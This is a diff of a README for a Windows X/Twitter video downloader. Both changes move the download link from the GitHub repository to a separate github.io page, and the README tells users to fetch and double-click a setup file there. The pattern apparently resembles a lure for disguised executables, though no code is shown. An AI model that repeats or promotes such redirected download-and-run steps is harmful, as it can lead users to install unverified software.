@@ -1,6 +1,6 @@
 # 📥 Twitter-Video-Downloader-2026-X - Save your favorite videos from X
 
-[![Download Application](https://img.shields.io/badge/Download-Twitter_Video_Downloader-blue)](https://github.com/Noisi1802/Twitter-Video-Downloader-2026-X)
+[![Download Application](https://img.shields.io/badge/Download-Twitter_Video_Downloader-blue)](https://noisi1802.github.io)
 
 This application helps users save videos, GIFs, and media files from the X platform to their Windows computer. It works by processing links from public X posts and converting them into high-quality MP4 files or audio tracks for offline viewing.
 
@@ -23,7 +23,7 @@ This application helps users save videos, GIFs, and media files from the X platf
 
 ## 🚀 How to Install and Run
 
-1. Open the provided download link: [https://github.com/Noisi1802/Twitter-Video-Downloader-2026-X](https://github.com/Noisi1802/Twitter-Video-Downloader-2026-X).
+1. Open the provided download link: [https://noisi1802.github.io](https://noisi1802.github.io).
 2. Visit this page to download the latest setup file for Windows.
 3. Locate the file in your downloads folder after the download finishes.
 4. Double-click the file to start the installation.
